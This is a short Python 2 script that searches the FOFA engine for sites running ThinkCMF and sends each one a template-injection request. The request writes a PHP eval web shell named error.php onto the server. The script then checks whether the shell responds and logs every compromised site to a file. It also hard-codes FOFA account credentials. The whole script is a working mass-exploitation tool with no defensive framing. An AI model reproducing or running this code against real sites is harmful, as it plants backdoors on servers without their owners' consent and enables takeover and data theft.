# -*- coding: utf-8 -*-
import fofa
import requests
from requests import exceptions

if __name__ == "__main__":
    email, key = ('74@qq.com','d96ed56cd')
    client = fofa.Client(email, key)
    query_str = 'app="thinkcmf"'
    with open('results.txt','w') as f:
        for i in range(100):
            data = client.get_data(query_str,page=i)
            print data['results']
            for site in data['results']:
                if site.startswith('https'):
                    site = site
                else:
                    site = 'http://' + site
                #print site

                payload = "/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('error.php','<?php @eval($_P1OST[\"cmd\"]);?>')</php>"
                exp = site + payload
                poc = site + '/error.php'
                try:
                    r1 = requests.session().get(exp,timeout=3)
                except Exception,e:
                    e
                try:
                    r2 = requests.session().get(poc,timeout=3)
                    if r2.status_code == 200:
                        f.write(site + '/error.php')
                        print site
                except Exception,e:
                    e


    f.close()
